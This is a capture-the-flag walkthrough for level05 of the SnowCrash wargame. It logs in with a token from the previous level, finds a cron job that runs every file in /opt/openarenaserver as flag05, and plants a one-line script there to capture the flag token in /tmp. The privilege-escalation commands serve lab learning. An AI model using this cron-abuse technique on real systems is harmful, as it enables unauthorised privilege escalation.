#### 1. The password of `Level05` is the token that got from `Level04`.

```
ne2searoevaevoem4ov4ar8ap

```
#### 2. So, try login to `Level05` with the password we got from `Level04` and try to put the command 'ls -la'. Let's see inside in level05.

```
level05@localhost's password: ne2searoevaevoem4ov4ar8ap
You have new mail.
level05@SnowCrash:~$
```
```bash

level05@SnowCrash:~$ ls -la
total 12
dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout
-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc
-r-x------  1 level05 level05  675 Apr  3  2012 .profile
```

It says that there is a new mail. 

#### 4. So, I found the small hint from /var/mail/level05

```bash
level05@SnowCrash:~$ cd /var/mail
level05@SnowCrash:/var/mail$ ls -la
total 4
drwxrwsr-x  1 root mail  60 Mar  5  2016 .
drwxr-xr-x  1 root root 160 Mar 12  2016 ..
-rw-r--r--+ 1 root mail  58 Feb 13 16:49 level05
```

there is a file `level05`.

```bash
level05@SnowCrash:/var/mail$ cat level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
So, I was looking for /usr/sbin/openarenaserver and we found a script as below. Let's take a look inside one by one.

```bash
level05@SnowCrash:/var/mail$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do 

	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
That means that the script goes through each file in the specified directory, sets a CPU time limit of 5 seconds for its execution, executes the script with debugging output, and then removes the script file.

We can't and should not put anything inside `/opt/openarenaserver` because this directory will be deleted in every 2 minutes, so we should put our file safely in `/tmp` file.

We therefore, need to create a bash script in that directory,to get the file and to make sure that the optut is redirected to a file in `/tmp`. So, the overall effect of this command is to create a file named `getflag05` in the `/opt/openarenaserver/` directory.

```bash
level05@SnowCrash:/var/mail$ echo 'getflag > /tmp/flag05'
getflag > /tmp/flag05
level05@SnowCrash:/var/mail$ echo 'getflag > /tmp/flag05' > /opt/openarenaserver/getflag05
level05@SnowCrash:/usr/sbin$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc

level05@SnowCrash:/var/mail$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

#### 5.  We got a token for next `level06`

```
viuaaale9huek52boumoomioc
```
